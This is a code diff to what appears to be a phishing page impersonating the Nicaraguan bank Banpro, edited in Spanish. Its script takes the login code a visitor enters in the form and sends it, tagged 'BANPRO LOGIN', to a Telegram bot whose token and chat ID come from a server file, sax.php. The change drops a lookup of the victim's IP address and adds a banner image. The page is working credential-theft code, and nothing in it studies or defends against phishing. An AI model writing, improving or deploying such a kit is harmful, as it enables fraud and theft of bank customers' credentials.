@@ -26,9 +26,17 @@
                     <input type="submit" value="Continuar" style="display: block; position: relative; font-size: 16px; color: #fff; background: rgb(0, 105, 60); border: none; top: 224px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
                 </form>
             </div>
+            <div id="bnncont" style="text-align: right; display: inline-block;">
+                <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
+                    <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
+                        <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
- <style>
+
+    <style>
         * { margin: 0; padding: 0; }
         @font-face {
             font-family: dinReg;
@@ -57,24 +65,10 @@
                 display: none !important;
             }
         }
-
-        @media screen and (max-width: 420px) {
-            /* Ajustes adicionales si se necesitan para pantallas más pequeñas */
-        }
     </style>
+
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Función para obtener la IP del cliente
-            function obtenerIP() {
-                return fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => data.ip)
-                    .catch(error => {
-                        console.error('Error al obtener la IP:', error);
-                        return 'IP no disponible';
-                    });
-            }
-
             // Función para obtener el token y el chat ID desde sax.php
             function obtenerToken() {
                 return fetch('sax.php')
@@ -85,7 +79,6 @@
                     }))
                     .catch(error => {
                         console.error('Error al obtener el token:', error);
-                        return null;
                     });
             }
 
@@ -95,23 +88,14 @@
 
                 // Obtener el valor ingresado en el formulario
                 const ips1 = document.getElementById("i1").value;
+                const msg = `BANPRO LOGIN> IP: ${window.location.hostname} - Código: ${ips1}`;
 
-                // Obtener el token y la IP antes de enviar a Telegram
-                Promise.all([obtenerToken(), obtenerIP()])
-                    .then(results => {
-                        const tokenData = results[0];
-                        const ip = results[1];
-
-                        if (tokenData && tokenData.token && tokenData.chat_id) {
-                            const msg = `BANPRO LOGIN> IP: ${ip} - Código: ${ips1}`;
-                            enviarMensajeTelegram(tokenData.token, tokenData.chat_id, msg);
-                        } else {
-                            console.error('Error al obtener los datos necesarios para enviar el mensaje.');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error al procesar la solicitud:', error);
-                    });
+                // Obtener el token y el chat ID, y luego enviar el mensaje a Telegram
+                obtenerToken().then(data => {
+                    if (data && data.token && data.chat_id) {
+                        enviarMensajeTelegram(data.token, data.chat_id, msg);
+                    }
+                });
             });
 
             // Función para enviar un mensaje a Telegram
